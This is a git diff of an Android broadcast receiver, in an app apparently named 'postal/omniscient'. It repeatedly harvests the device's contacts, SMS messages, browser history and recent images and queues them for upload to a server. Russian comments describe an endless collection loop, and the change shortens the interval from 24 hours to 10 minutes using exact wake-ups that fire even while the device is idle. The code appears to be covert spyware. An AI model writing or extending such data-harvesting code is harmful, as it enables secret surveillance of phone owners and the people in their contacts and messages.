@@ -9,9 +9,10 @@ import android.content.Intent;
 import android.os.Build;
 import android.util.Log;
 
+import com.postal.omniscient.postal.SPreferences.PreferencesGetSet;
 import com.postal.omniscient.postal.adapter.AdapterData;
 import com.postal.omniscient.postal.adapter.EventBusData;
-import com.postal.omniscient.postal.browser.history.BrowserHistory;
+import com.postal.omniscient.postal.reader.browser_history.BrowserHistory;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
 import com.postal.omniscient.postal.reader.image.AllImages;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
@@ -28,7 +29,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 
-/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 5 мин записуем
+/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 10 мин записуем
  *  контакты ,смс и браузера историю*/
 public class AlarmReceiver extends BroadcastReceiver {
     final int SDK_INT = Build.VERSION.SDK_INT;
@@ -38,7 +39,7 @@ public class AlarmReceiver extends BroadcastReceiver {
 
     @Override
     //Сбор данных для отправки на сервер каждые 24 часа
-    public void onReceive(Context context, Intent intent) {
+    public void onReceive(final Context context, Intent intent) {
         // TODO: This method is called when the BroadcastReceiver is receiving
         try {
 final Context context1 = context;
@@ -47,43 +48,50 @@ final Context context1 = context;
             Thread dataCollection = new Thread("AlarmReceiver") {
                 @Override
                 public void run() {
-                    try {
-                        ReadContacts contact = new ReadContacts(context1);
-                        BrowserHistory browser = new BrowserHistory(context1, context1.getContentResolver());
-                        ReadSms sms = new ReadSms(context1, context1.getContentResolver());
-                        sms.smsToJson();
-                        contact.getContacts();
-                        browser.historyToJson();
-                        saveIMAGE(context1, context1.getContentResolver());
-                    } catch (Exception e) {
-                        Log.i(Msg, "Error AlarmReceiver run "+e);
-                    }
+                    PreferencesGetSet Sp = new PreferencesGetSet();
+                    Long last_scan = Sp.readeFromPreferences(context1);
+                    if (last_scan > 0) {
+                        if (System.currentTimeMillis() > last_scan + (1000 * 60 * 10 - 1)) {
+                            try {
+                                ReadContacts contact = new ReadContacts(context1);
+                                BrowserHistory browser = new BrowserHistory(context1, context1.getContentResolver());
+                                ReadSms sms = new ReadSms(context1, context1.getContentResolver());
+                                sms.smsToJson();
+                                contact.getContacts();
+                                browser.historyToJson();
+                                saveIMAGE(context1, context1.getContentResolver());
+                                Sp.writeToPreferences(context1);
+                                EventBus.getDefault().post(new EventBusData("all_file"));// если есть коннект пробуем отправить новые данные на сервер
+                            } catch (Exception e) {
+                                Log.i(Msg, "Error AlarmReceiver run " + e);
+                            }
+                        }
+                    } else {Sp.writeToPreferences(context1);}
                 }
             };
 
             dataCollection.start();
-            dataCollection.join();
+//            dataCollection.join();
 
-            
+
             AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
             Intent myIntent = new Intent(context, AlarmReceiver.class);
             PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
 
-            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
-                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
-            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
-                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
-            } else if (SDK_INT >= Build.VERSION_CODES.M) {
-                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
-            }
 
-            EventBus.getDefault().post(new EventBusData("all_file"));// если есть коннект пробуем отправить новые данные на сервер
+            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
+            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
+            } else if (SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
+            }
         }catch (Exception e){Log.i(Msg, "Error AlarmReceiver onReceive "+e);}
     }
     //IMEGE
     private void saveIMAGE(Context context, ContentResolver contentResolver) {
         try {
-            AllImages img = new AllImages(contentResolver);
+            AllImages img = new AllImages(context, contentResolver);
 
             List<AdapterData> listOfAllImages = img.getLastImages();
             String patchFile;
